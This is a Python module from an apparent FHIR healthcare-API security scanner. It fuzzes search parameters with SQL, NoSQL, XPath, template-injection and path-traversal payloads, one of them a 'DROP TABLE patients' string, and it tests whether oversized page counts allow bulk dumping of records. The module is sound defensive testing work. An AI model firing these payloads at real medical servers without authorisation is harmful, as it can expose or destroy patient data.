"""Search parameter fuzzing — injection, type confusion, filter abuse."""

from __future__ import annotations

import asyncio
from typing import Any

import httpx
from rich.console import Console

from fhirbug.core.client import FHIRClient
from fhirbug.core.config import (
    INJECTABLE_SEARCH_PARAMS,
    SPECIAL_SEARCH_PARAMS,
    TargetConfig,
)
from fhirbug.core.models import (
    EndpointInfo,
    Finding,
    FindingCategory,
    ScanResult,
    Severity,
)

console = Console()

# Injection payloads for FHIR search parameters
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE patients;--",
    "1 UNION SELECT null,null,null--",
    "' OR 1=1--",
    "1' WAITFOR DELAY '0:0:5'--",
]

NOSQL_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$regex": ".*"}',
    '{"$where": "1==1"}',
]

XPATH_PAYLOADS = [
    "'] | //*[contains(.,'",
    "' or '1'='1",
    "1 or 1=1",
]

SSTI_PAYLOADS = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
]

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
]

# FHIR-specific search abuse patterns
FHIR_SEARCH_ABUSE = {
    "_count": ["999999", "0", "-1", "2147483647"],
    "_offset": ["-1", "999999999", "0"],
    "_sort": [
        "-_lastUpdated",  # reverse sort, normal
        "nonexistent_field",  # invalid field
        "_content",  # may trigger full-text sort
    ],
    "_summary": ["true", "text", "data", "count", "false"],
    "_elements": [
        "id,meta",
        "id,text,contained",
        "*",  # wildcard
        "extension.valueString",  # nested path
    ],
    "_total": ["accurate", "estimate", "none"],
    "_contained": ["true", "both"],
    "_containedType": ["container", "contained"],
}


async def fuzz_search_injection(
    client: FHIRClient,
    config: TargetConfig,
    info: EndpointInfo,
    result: ScanResult,
) -> None:
    """Test search parameters for injection vulnerabilities."""
    console.print("\n[bold]Fuzzing search parameters for injection...[/]")

    # Pick a resource that supports search
    target_resources = [
        r for r in info.supported_resources if r in ("Patient", "Observation", "Encounter")
    ]
    if not target_resources:
        target_resources = info.supported_resources[:3]

    for resource in target_resources:
        resource_params = info.search_params.get(resource, [])
        # Find injectable string params
        string_params = [
            p for p in resource_params if p in INJECTABLE_SEARCH_PARAMS
        ] or ["name", "identifier"]  # fallback to common ones

        target_param = string_params[0]
        url = config.resource_url(resource)
        console.print(f"\n  [cyan]Target:[/] {resource}?{target_param}=<payload>")

        # SQL injection
        await _test_payload_set(
            client, url, target_param, SQLI_PAYLOADS,
            "SQL Injection", resource, result,
            indicators=["sql", "syntax", "mysql", "postgresql", "oracle",
                        "sqlite", "odbc", "jdbc", "ORA-", "PG::"],
        )

        # NoSQL injection
        await _test_payload_set(
            client, url, target_param, NOSQL_PAYLOADS,
            "NoSQL Injection", resource, result,
            indicators=["mongo", "bson", "json", "operator"],
        )

        # SSTI
        await _test_payload_set(
            client, url, target_param, SSTI_PAYLOADS,
            "Server-Side Template Injection", resource, result,
            indicators=["49", "7*7"],  # resolved template = 49
        )

        # Path traversal
        await _test_payload_set(
            client, url, target_param, TRAVERSAL_PAYLOADS,
            "Path Traversal", resource, result,
            indicators=["root:", "bin/", "[boot loader]", "passwd"],
        )


async def _test_payload_set(
    client: FHIRClient,
    url: str,
    param: str,
    payloads: list[str],
    attack_name: str,
    resource: str,
    result: ScanResult,
    indicators: list[str],
) -> None:
    """Fire a set of payloads and check for indicators in responses.

    To avoid false positives from generic error pages (Azure App Gateway WAF,
    Apache/IIS error templates, etc.) we baseline against a benign value first
    and only consider an indicator a hit if it appears in the payload response
    AND NOT in the baseline. We also reject HTML responses for FHIR APIs since
    a real FHIR server returns JSON/XML — an HTML body almost always means
    a WAF/proxy intercepted the request before reaching the FHIR layer.
    """
    # Baseline: send a benign string and capture the response body for diffing.
    baseline_body = ""
    baseline_ct = ""
    try:
        baseline_resp = await client.get(
            url, params={param: "fhirfuzz_baseline_xyzzy", "_count": "1"}
        )
        baseline_body = baseline_resp.text.lower()
        baseline_ct = baseline_resp.headers.get("content-type", "").lower()
    except httpx.HTTPError:
        pass

    for payload in payloads:
        try:
            resp = await client.get(url, params={param: payload, "_count": "1"})
            body = resp.text.lower()
            content_type = resp.headers.get("content-type", "").lower()

            # Reject HTML responses — FHIR servers respond with json/xml.
            # An HTML body means we hit a WAF/proxy error page, not the API.
            if "html" in content_type or body.lstrip().startswith("<!doctype") or body.lstrip().startswith("<html"):
                continue

            # Indicator must (a) appear in the payload response AND
            # (b) NOT appear in the benign baseline response. Otherwise it
            # is a property of the error template, not evidence of injection.
            hits = [
                i for i in indicators
                if i.lower() in body and i.lower() not in baseline_body
            ]
            if hits:
                result.add_finding(Finding(
                    title=f"Possible {attack_name} in {resource}.{param}",
                    severity=Severity.HIGH,
                    category=FindingCategory.INJECTION,
                    description=(
                        f"Search parameter {param} on {resource} returned a response "
                        f"containing indicators of {attack_name}: {hits}. "
                        f"Payload: {payload}"
                    ),
                    endpoint=f"{url}?{param}={payload}",
                    evidence={
                        "payload": payload,
                        "indicators": hits,
                        "status_code": resp.status_code,
                        "response_snippet": resp.text[:500],
                    },
                ))
                console.print(f"    [red]POSSIBLE {attack_name}:[/] indicators={hits}")
                return  # one hit per attack type per resource is enough

            # Check for timing-based indicators (5xx on injection payloads)
            if resp.status_code >= 500:
                result.add_finding(Finding(
                    title=f"Server error on {attack_name} payload in {resource}.{param}",
                    severity=Severity.MEDIUM,
                    category=FindingCategory.INJECTION,
                    description=(
                        f"Server returned {resp.status_code} when {param} contained "
                        f"an {attack_name} payload. This may indicate the payload "
                        f"reached a backend parser/query engine."
                    ),
                    endpoint=f"{url}?{param}={payload}",
                    evidence={
                        "payload": payload,
                        "status_code": resp.status_code,
                        "response_snippet": resp.text[:500],
                    },
                ))
                return

        except httpx.HTTPError:
            pass


async def fuzz_search_abuse(
    client: FHIRClient,
    config: TargetConfig,
    info: EndpointInfo,
    result: ScanResult,
) -> None:
    """Test FHIR-specific search parameter abuse patterns."""
    console.print("\n[bold]Testing FHIR search parameter abuse...[/]")

    resource = next(
        (r for r in info.supported_resources if r == "Patient"),
        info.supported_resources[0] if info.supported_resources else "Patient",
    )
    url = config.resource_url(resource)

    # Test _count abuse — can we dump everything?
    console.print(f"\n  [cyan]Testing _count abuse on {resource}...[/]")
    for count_val in FHIR_SEARCH_ABUSE["_count"]:
        try:
            resp = await client.get(url, params={"_count": count_val})
            if resp.status_code == 200:
                body = resp.json()
                returned = len(body.get("entry", []))
                total = body.get("total", "?")
                if returned > 100:
                    result.add_finding(Finding(
                        title=f"Excessive _count accepted: {resource}?_count={count_val} returned {returned} records",
                        severity=Severity.MEDIUM,
                        category=FindingCategory.DATA_LEAK,
                        description=(
                            f"Server accepted _count={count_val} and returned {returned} "
                            f"records (total={total}). No server-side cap on page size "
                            "enables rapid bulk data exfiltration."
                        ),
                        endpoint=f"{url}?_count={count_val}",
                        evidence={
                            "count_requested": count_val,
                            "records_returned": returned,
                            "total": total,
                        },
                    ))
                    console.print(f"    [red]_count={count_val} returned {returned} records![/]")
                    break
        except httpx.HTTPError:
            pass

    # Test _filter — this is a powerful search extension
    console.print(f"  [cyan]Testing _filter support on {resource}...[/]")
    filter_payloads = [
        "name eq 'test'",
        "name co 'a'",  # contains — broad match
        "_lastUpdated gt 2000-01-01",  # everything since Y2K
        "name co '' or true",  # boolean injection in filter
    ]
    for filt in filter_payloads:
        try:
            resp = await client.get(url, params={"_filter": filt, "_count": "1"})
            if resp.status_code == 200:
                result.add_finding(Finding(
                    title=f"_filter search parameter supported on {resource}",
                    severity=Severity.MEDIUM,
                    category=FindingCategory.CONFIG,
                    description=(
                        f"The _filter parameter is active on {resource}. "
                        "_filter enables complex query expressions that bypass "
                        "standard search parameter restrictions. Test for "
                        "injection in the filter expression grammar."
                    ),
                    endpoint=f"{url}?_filter={filt}",
                    evidence={"filter": filt, "status": resp.status_code},
                ))
                console.print(f"    [yellow]_filter is supported![/]")
                break
        except httpx.HTTPError:
            pass

    # Test chained search — cross-resource queries
    console.print(f"  [cyan]Testing chained search parameters...[/]")
    chain_tests = [
        ("Observation", {"subject:Patient.name": "test", "_count": "1"}),
        ("Encounter", {"subject:Patient.identifier": "test", "_count": "1"}),
        ("MedicationRequest", {"subject:Patient.name": "test", "_count": "1"}),
    ]
    for chain_resource, chain_params in chain_tests:
        if chain_resource not in info.supported_resources:
            continue
        chain_url = config.resource_url(chain_resource)
        try:
            resp = await client.get(chain_url, params=chain_params)
            if resp.status_code == 200:
                console.print(f"    [yellow]Chained search works: {chain_resource}?{list(chain_params.keys())[0]}[/]")
        except httpx.HTTPError:
            pass

    # Test _has — reverse chaining
    console.print(f"  [cyan]Testing _has (reverse chain)...[/]")
    try:
        resp = await client.get(
            config.resource_url("Patient"),
            params={"_has:Observation:subject:code": "http://loinc.org|1234", "_count": "1"},
        )
        if resp.status_code == 200:
            console.print("    [yellow]_has reverse chaining is supported[/]")
    except httpx.HTTPError:
        pass
